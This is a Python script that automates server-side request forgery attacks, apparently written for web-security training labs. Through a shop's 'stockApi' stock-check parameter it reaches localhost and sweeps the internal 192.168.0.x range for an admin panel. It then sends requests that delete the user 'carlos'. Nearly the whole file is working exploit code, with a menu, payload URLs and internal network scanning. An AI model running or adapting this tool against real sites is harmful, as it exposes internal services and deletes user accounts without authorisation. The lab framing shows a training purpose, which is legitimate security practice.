import requests
from tabulate import tabulate
from urllib.parse import urlparse

class textcolor:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    DANGER = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class SSRFVulnerability:

    def __init__(self, base_url):
        self.base_url = base_url

    def local_server(self, url):
        payload = {'stockApi': url}
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}

        try:
            response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers)
            print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+url+"'"+textcolor.ENDC)
            return 1

        except requests.exceptions.RequestException as e:
            print("\n"+textcolor.DANGER+"Error occurred: "+textcolor.ENDC)
            print(f"{str(e)}\n")
        except Exception as e:
            print(f"\n"+textcolor.DANGER+"Unexpected error occurred:"+textcolor.ENDC)
            print(f"{str(e)}\n")

    def internal_system(self):
        try:
            for i in range(1, 256):

                ip = '192.168.0.'+str(i)
                payload = {'stockApi': 'http://'+ip+':8080'+'/admin'}
                headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(payload))}

                response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers)

                print(textcolor.OKCYAN+" [*] Checking "+str(ip)+": "+str(response.status_code)+" HTTP status"+textcolor.ENDC,end="\r")

                if response.status_code == 200:
                    print(textcolor.OKGREEN+"\n\n"+ip+": 200 HTTP status"+textcolor.ENDC)
                    payloadURL = 'http://'+ip+':8080'+'/admin/delete?username=carlos'
                    payload = {'stockApi': payloadURL}

                    try:
                        print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: '"+payloadURL+"'"+textcolor.ENDC)
                        response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers, timeout=3)
                    except requests.exceptions.ConnectTimeout as e:
                        return 1
        except:
            print(textcolor.DANGER+"\nError occured: Check URL and/or Lab properly"+textcolor.ENDC)
            return 0

def validate_url(url):
    parsed_url = urlparse(url)
    if parsed_url.scheme and parsed_url.netloc:
        return True
    return False

def handle_choice(number, instance):

    if number == 1:

        result = instance.local_server('http://localhost/admin/delete?username=carlos')
        if result:
            print(textcolor.OKGREEN+"Local Server: Username Deleted Successfully\n"+textcolor.ENDC)

    elif number == 2:
        
        result = instance.internal_system()
        if result:
            print(textcolor.OKGREEN+"Remote Server: Username Deleted Successfully\n"+textcolor.ENDC)

    elif number == 3:
        print("Placeholder")
    else:
        print(textcolor.DANGER+"\nInvalid choice."+textcolor.ENDC)

def main():

    try:
        url = input("\n"+textcolor.WARNING+"Enter the URL to perform SSRF: "+textcolor.ENDC)
    except:
        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)
        return

    # Validate the URL
    if not validate_url(url):
        print(textcolor.DANGER+"Invalid URL: Check properly\n"+textcolor.ENDC)
        return

    data = [
        [textcolor.OKBLUE+"(1)"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against the local server"+textcolor.ENDC],
        [textcolor.OKBLUE+"(2)"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against another back-end system"+textcolor.ENDC],
        [textcolor.OKBLUE+"(3)"+textcolor.ENDC, textcolor.OKBLUE+"SSRF with blacklist-based input filter"+textcolor.ENDC]
    ]

    headers = [textcolor.OKGREEN+"Labs"+textcolor.ENDC,textcolor.OKGREEN+"Title"+textcolor.ENDC]

    # Generate the table
    table = tabulate(data, headers, tablefmt="pretty")

    # Print the table
    print("\n"+table)

    try:
        choice = input("\n"+textcolor.WARNING+"Enter your Lab (1-7): "+textcolor.ENDC)
        #choice = 2
    except:
        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)
        return

    # Create an instance of SSRFVulnerability with the base URL of the shopping application
    instanceVar = SSRFVulnerability(url)

    try:
        handle_choice(int(choice), instanceVar)
    except:
        print(textcolor.DANGER+"\nInvalid Input\n"+textcolor.ENDC)

if __name__ == '__main__':
    main()
